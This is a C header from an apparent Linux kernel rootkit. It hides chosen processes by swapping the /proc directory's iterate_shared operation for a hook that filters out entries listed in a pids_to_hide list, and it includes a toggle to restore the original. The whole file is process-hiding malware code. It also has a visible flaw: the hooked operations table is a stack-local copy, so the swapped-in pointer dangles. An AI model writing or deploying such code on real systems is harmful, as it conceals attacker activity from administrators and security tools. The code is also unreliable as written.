#ifndef HIDE_PROCESS_KITE
    #define HIDE_PROCESS_KITE
    #include <linux/proc_fs.h>
    #include <linux/namei.h>
    #include <linux/path.h>
    #include "linked_list.h"


static int hack_filldir(struct dir_context *, const char *, int , loff_t , u64 , unsigned );
struct dir_context fake_ctx = {
    .actor = hack_filldir,
};
struct dir_context *backup_ctx;
static int hide_process_active = 0;

static const struct file_operations *backup_fops;

int hack_iterate_shared(struct file *file, struct dir_context *ctx){
    int result = 0;
    fake_ctx.pos = ctx->pos;
    backup_ctx = ctx;
    result = backup_fops->iterate_shared(file, &fake_ctx);
    ctx->pos = fake_ctx.pos;
    return result;
}


static int hack_filldir(struct dir_context *ctx, const char *name, int len, loff_t off, u64 ino, unsigned intd_type){
    if(find_node(&pids_to_hide, name) == 0){
        return 0;
    }
    return backup_ctx->actor(backup_ctx, name, len, off, ino, intd_type);
}

static int hide_process(void){
    struct path p;
    kern_path("/proc", 0, &p); // get path details
    struct inode *proc_inode = p.dentry->d_inode;
    struct file_operations proc_fops = *proc_inode->i_fop;
    backup_fops = proc_inode->i_fop;
    proc_fops.iterate_shared = hack_iterate_shared;
    proc_inode->i_fop = &proc_fops;
    hide_process_active = 1;
    return 1;
}


static void show_process(void){
    struct path p;
    kern_path("/proc", 0, &p); // get path details
    struct inode *proc_inode = p.dentry->d_inode;
    proc_inode->i_fop = backup_fops;
    hide_process_active = 0;
}

static void switch_hide_process(void){
    if(hide_process_active == 0){
        hide_process();
    }
    else{
        show_process();
    }
}
#endif